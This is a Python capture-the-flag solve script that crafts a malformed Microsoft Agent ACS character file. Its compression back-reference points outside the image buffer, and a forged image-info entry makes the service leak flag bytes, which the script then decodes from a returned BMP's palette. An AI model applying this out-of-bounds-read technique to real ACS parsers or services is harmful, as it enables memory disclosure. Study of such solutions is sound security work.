from struct import pack,unpack
from math import log, ceil
import bitstring
import acs

# this is from the challenge
def bitstream_to_bytes(data_bitstream, offset, length):
    data_bytes = data_bitstream[offset:offset+length]

    for i in range(0, len(data_bytes), 8):
        data_bytes.reverse(i, min(len(data_bytes), i+8))

    if len(data_bytes) % 8 != 0:
        # FIXME not sure, original seems wrong
        # data_bytes.prepend("0b" + "0"*(8-(len(data_bytes) % 8)))
        data_bytes.append("0b" + "1"*(8-(len(data_bytes) % 8)))

    return data_bytes.bytes

def rato(d, o, n):
    ''' replace at offset '''
    return d[:o]+n+d[o+len(n):]

def bin(i,n):
    ''' fix builtin '''
    return __builtins__.bin(i)[2:].rjust(n,'0')

def mk_off(off):
    ''' from compression spec '''
    bs=''
    bits = ceil(log(off,2))
    if bits<=6: bs+='0';d=0x1;b=6
    elif bits<=9: bs+='10';d=0x41;b=9
    elif bits<=12: bs+='110';d=0x241;b=12
    elif bits<=20: bs+='111';d=0x1241;b=20
    bs+=bin(off-d, b)[::-1] # yeah let's do bit streams backwards
    return bs

def mk_cnt(count):
    ''' from compression spec '''
    bits = ceil(log(count,2))-1
    count-=2
    bs =('1'*bits+'0')
    bs+=bin(count-(2**bits-1),bits)[::-1] # yeah let's do bit streams backwards
    return bs


with open('./bonz.acs', 'rb') as f:
    bonz = f.read()

acs = acs.Acs.from_bytes(bonz)

SIZE = 59*2 # flag size unicode
OFFSET = SIZE + 1+2+2+1+4+4+(acs.header.character_info.localized_info.arr[0].extra.size+1)*2 # imageinfo header + extra string

bs ='1' + mk_off(OFFSET) + mk_cnt(SIZE)
bs+='1'*24 # eos

db = bitstream_to_bytes(bitstring.BitArray(bin=bs),0,len(bs))
db = b'\x00' + db + b'\xff'*6

# make our own image info struct
ii0 = acs.header.image_info.arr[0].body
imginfo = pack('<BHHB', ii0.unk, ii0.width, ii0.height, ii0.compressed)
imginfo += pack('<I', len(db))+db
imginfo+= pack('<II', ii0.sz_compressed, ii0.sz_uncompressed) + bytes(ii0.region_data)

# append new image info and point first image at it, we can then retrieve with fave number 0
newbonz = bonz + imginfo
newbonz = rato(newbonz, acs.header.image_info_loc.offset+4, pack('II', len(bonz), len(imginfo)))

with open('./newbonz.acs', 'wb') as f:
    f.write(newbonz)

input(' <upload newbons.acs / download f4e13b63-d5b9-456b-a12f-0645543bcaad.bmp> ')


def img2bytes(img):
    ''' lookup pixel in palette to get byte '''
    byts = []
    for i in range(0,len(img),3):
        byts.append(bytes(acs.header.character_info.palette).index(img[i:i+3])//4)
    return bytes(byts)

with open('f4e13b63-d5b9-456b-a12f-0645543bcaad.bmp', 'rb') as f:
    bmp = f.read()

print(img2bytes(bmp[0x36:0x36+3*SIZE]).decode('utf-16'))
